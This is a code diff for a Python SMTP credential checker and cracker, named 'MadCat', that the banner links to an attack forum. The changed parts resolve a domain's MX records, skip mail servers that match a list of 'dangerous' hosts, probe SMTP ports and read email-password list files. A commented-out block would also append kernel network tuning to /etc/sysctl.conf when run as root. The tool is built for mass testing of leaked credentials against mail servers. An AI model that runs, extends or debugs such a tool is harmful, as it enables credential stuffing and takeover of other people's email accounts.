@@ -44,7 +44,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v55.11.11{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v24.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -86,6 +86,11 @@ def tune_network():
 			import resource
 			resource.setrlimit(8, (2**20, 2**20))
 			print(okk+'tuning rlimit_nofile:          '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
+			# if os.geteuid() == 0:
+			# 	print('tuning network settings...')
+			# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
+			# else:
+			# 	print('Better to run this script as root to allow better network performance')
 		except Exception as e:
 			print(wrn+'failed to set rlimit_nofile:   '+str(e))
 
@@ -209,37 +214,40 @@ def get_alive_neighbor(ip, port):
 		raise Exception('No listening neighbors found for '+ip+':'+str(port))
 
 def guess_smtp_server(domain):
-	global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains
-	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
-	try:
-		mx_records = list(resolver_obj.resolve(domain, 'mx'))
-		# ИСПРАВЛЕНИЕ: Перебираем ВСЕ MX записи, ищем первую безопасную
-		for mx in mx_records:
-			mx_candidate = str(mx.exchange).rstrip('.')
-			is_dangerous = re.search(dangerous_domains, mx_candidate) if dangerous_domains else False
-			is_outlook = 'outlook.com' in mx_candidate  # Outlook иногда можно
-			
-			if not is_dangerous or is_outlook:
-				domains_arr.append(mx_candidate)
-				break  # Берём первую рабочую MX
-	except Exception as e:
-		reason = 'solution lifetime expired'
-		if reason in str(e):
-			return switch_dns_nameserver() and guess_smtp_server(domain)
-		else:
-			raise Exception('no MX records found for: '+domain)
-	if re.search(r'protection\.outlook\.com$', mx_domain):
-		return domain_configs_cache['outlook.com']
-	for host in domains_arr:
-		try:
-			ip = get_rand_ip_of_host(host)
-		except:
-			continue
-		for port in [2525, 587, 465, 25]:
-			debug(f'trying {host}, {ip}:{port}')
-			if is_listening(ip, port):
-					return ([host+':'+str(port)], default_login_template)
-	raise Exception('no connection details found for '+domain)
+    global default_login_template, resolver_obj, domain_configs_cache, dangerous_regex
+    domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
+    mx_domain = None
+    try:
+        mx_records = list(resolver_obj.resolve(domain, 'mx'))
+        # ПРАВКА: Перебираем все MX записи, берём первую безопасную
+        for mx in mx_records:
+            mx_candidate = str(mx.exchange).rstrip('.')
+            is_dangerous = (dangerous_regex and dangerous_regex.search(mx_candidate))
+            is_outlook = re.search(r'\.outlook\.com$', mx_candidate)
+            if not (is_dangerous and not is_outlook):
+                domains_arr.append(mx_candidate)
+                mx_domain = mx_candidate
+                break
+    except Exception as e:
+        reason = 'solution lifetime expired'
+        if reason in str(e):
+            switch_dns_nameserver()
+            return guess_smtp_server(domain)
+        raise Exception('no MX records found for: '+domain)
+    
+    if mx_domain and re.search(r'protection\.outlook\.com$', mx_domain):
+        return domain_configs_cache.get('outlook.com', ([], default_login_template))
+    
+    for host in domains_arr:
+        try:
+            ip = get_rand_ip_of_host(host)
+        except:
+            continue
+        for port in [2525, 587, 465, 25]:
+            debug(f'trying {host}, {ip}:{port}')
+            if is_listening(ip, port):
+                return ([host+':'+str(port)], default_login_template)
+    raise Exception('no connection details found for '+domain)
 
 def get_smtp_config(domain):
 	global domain_configs_cache, default_login_template
@@ -256,7 +264,7 @@ def quit(signum, frame):
 def is_valid_email(email):
 	return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)
 
-def find_email_password_columns(list_filename):
+def find_email_password_collumnes(list_filename):
 	email_collumn = False
 	with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
 		for line in fp:
@@ -493,7 +501,7 @@ try:
 except Exception as e:
 	exit(err+red(e))
 try:
-	email_collumn, password_collumn = find_email_password_columns(list_filename)
+	email_collumn, password_collumn = find_email_password_collumnes(list_filename)
 except Exception as e:
 	exit(err+red(e))
 
